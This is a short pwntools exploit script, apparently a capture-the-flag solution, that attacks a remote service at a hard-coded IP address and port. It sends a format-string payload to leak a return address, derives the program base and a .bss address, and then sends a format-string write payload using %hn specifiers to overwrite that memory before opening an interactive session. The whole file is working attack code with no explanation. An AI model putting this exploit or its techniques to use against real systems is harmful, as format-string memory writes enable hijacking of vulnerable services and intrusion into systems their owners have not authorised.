from pwn import *

io=remote('139.129.76.65','50005')
io.sendline('a'*16+'%15$p')
io.recvuntil('preparing......')
io.recvline()
ret=int(io.recvline()[2:],16)
base=ret-0x00CCD
bss=base+0x02020E0
print(hex(bss))
pl2="%26213c"+"a%9$hn%10$hnaaaaa"+p64(bss)+p64(bss+2)
#pl2='aaaaaaaa'+'%6$p'
io.sendline(pl2)

io.interactive()
